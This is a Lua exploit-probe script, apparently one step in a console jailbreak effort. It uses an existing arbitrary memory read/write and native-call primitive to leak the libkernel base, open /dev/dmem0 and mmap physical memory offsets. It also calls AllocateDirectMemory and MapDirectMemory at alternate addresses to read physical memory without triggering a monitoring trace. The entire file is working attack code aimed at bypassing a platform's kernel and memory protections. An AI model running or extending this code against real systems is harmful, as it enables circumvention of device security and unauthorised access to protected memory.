-- CRASH_CLASS: MODERATE
-- PROBE 562z: mmap /dev/dmem0 fd at physical offsets
--
-- 562y: pread/read on /dev/dmem0 returns -1 (device doesn't support file I/O)
-- 562x: MapDM VA access = trace trigger
--
-- ALTERNATIVE: mmap(2) with dmem0 fd goes through device d_mmap handler.
-- This is a DIFFERENT code path from MapDirectMemory (libkernel wrapper).
-- If d_mmap maps physical memory without MapDM monitoring → we can read it.
--
-- Also test: MapDM to a different VA (not 0x880000000) to see if
-- the monitoring is VA-range-specific.
--
-- Also test: AllocateDirectMemory + mmap on dmem0 fd at allocated phys addr.

print("=== PROBE 562z: DMEM0 MMAP + ALT VA ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- libkernel base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
print(string.format("lk=0x%X%08X", lhi, llo))

local alloc_fn = lk + uint64(0x17EF0)  -- AllocateDirectMemory
local mapdm_fn = lk + uint64(0x15020)  -- MapDirectMemory
io.flush()

-- ============================================================
-- [A] Open /dev/dmem0
-- ============================================================
print("[A] open /dev/dmem0")
local dp = memory.alloc(16)
wd(N(dp), 0x7665642F); wd(N(dp) + 4, 0x656D642F); wd(N(dp) + 8, 0x0000306D)
local ok_o, fd_raw = pcall(function()
    return native.fcall_with_rax(stub, 5, dp, uint64(2))
end)
local fd = ok_o and N(fd_raw) or -999
print("  fd=" .. fd)
if fd < 0 then print("OPEN FAILED"); print("=== 562z DONE ==="); return end
io.flush()

-- ============================================================
-- [B] mmap dmem0 fd at physical offset 0 (MAP_SHARED)
-- ============================================================
print("")
print("[B] mmap(dmem0, phys offsets)")

local test_offsets = {
    {0, 0, "phys_0x0"},
    {0, 0x1000000, "phys_16MB"},
    {1, 0x00000000, "phys_4GB"},
    {1, 0x10010000, "phys_alloc_range"},
}

for idx, entry in ipairs(test_offsets) do
    local off_hi, off_lo, label = entry[1], entry[2], entry[3]
    local phys_off
    if off_hi > 0 then
        phys_off = uint64(string.format("0x%X%08X", off_hi, off_lo))
    else
        phys_off = uint64(off_lo)
    end

    -- mmap(0, 0x4000, PROT_READ=1, MAP_SHARED=1, fd, phys_offset)
    local ok_mm, va_raw = pcall(function()
        return sc477(Z, uint64(0x4000), uint64(1),
            uint64(0x0001), uint64(fd), phys_off)
    end)
    local va = ok_mm and N(va_raw) or -1

    if va > 0 and va ~= 0xFFFFFFFF then
        -- Try to read from the mapped VA
        local ok_rd, val = pcall(function()
            return memory.read_dword(va)
        end)
        if ok_rd then
            local v = rb(va) or 0
            local v4 = rb(va + 4) or 0
            local tag = ""
            if v == 0x464C457F then tag = " *** ELF! ***" end
            print(string.format("  %s: va=0x%X [%08X_%08X]%s", label, va, v4, v, tag))
        else
            print(string.format("  %s: va=0x%X READ_CRASH", label, va))
        end
    else
        -- mmap failed, try MAP_SHARED|MAP_PREFAULT_READ
        local ok_mm2, va_raw2 = pcall(function()
            return sc477(Z, uint64(0x4000), uint64(3),
                uint64(0x0001), uint64(fd), phys_off)
        end)
        local va2 = ok_mm2 and N(va_raw2) or -1
        if va2 > 0 and va2 ~= 0xFFFFFFFF then
            print(string.format("  %s: va=0x%X (RW+SHARED)", label, va2))
        else
            print(string.format("  %s: MMAP_FAIL rv=%d/%d", label, va, va2))
        end
    end
    io.flush()
end

-- ============================================================
-- [C] AllocateDirectMemory + mmap dmem0 at allocated phys addr
-- ============================================================
print("")
print("[C] AllocDM + mmap dmem0")
local phys_out = memory.alloc(8)
wq(N(phys_out), Z)
local ok_a, rv_a = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        Z, uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), phys_out)
end)
local alloc_rv = ok_a and N(rv_a) or -999
local plo = rb(N(phys_out)) or 0
local phi = rb(N(phys_out) + 4) or 0
print(string.format("  alloc rv=%d phys=0x%X%08X", alloc_rv, phi, plo))

if alloc_rv == 0 then
    local phys_addr = uint64(string.format("0x%X%08X", phi, plo))
    local ok_mm3, va3_raw = pcall(function()
        return sc477(Z, uint64(0x4000), uint64(3),
            uint64(0x0001), uint64(fd), phys_addr)
    end)
    local va3 = ok_mm3 and N(va3_raw) or -1
    print(string.format("  mmap(dmem0, alloc_phys) va=%d", va3))
    if va3 > 0 then
        local ok_rd3, _ = pcall(function()
            return memory.read_dword(va3)
        end)
        if ok_rd3 then
            local v = rb(va3) or 0
            print(string.format("  read: 0x%08X", v))
        else
            print("  read: CRASH")
        end
    end
end
io.flush()

-- ============================================================
-- [D] MapDM to alternative VA (0x200400000 instead of 0x880000000)
-- ============================================================
print("")
print("[D] MapDM to alt VA 0x200400000")
local alt_va = uint64("0x200400000")
pcall(function()
    native.fcall_with_rax(stub, 477,
        alt_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        alt_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print("  MapDM rv=" .. md_rv)

if md_rv == 0 then
    -- Try direct read
    print("  trying direct read...")
    io.flush()
    local ok_dr, val_dr = pcall(function()
        return memory.read_dword(N(alt_va))
    end)
    if ok_dr then
        local v = rb(N(alt_va)) or 0
        local v4 = rb(N(alt_va) + 4) or 0
        print(string.format("  READ OK: %08X_%08X", v4, v))
        if v == 0x464C457F then print("  *** ELF MAGIC! ***") end
    else
        print("  READ_CRASH (trace?)")
    end
end
io.flush()

-- ============================================================
-- [E] Alive check
-- ============================================================
print("")
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562z DONE ===")
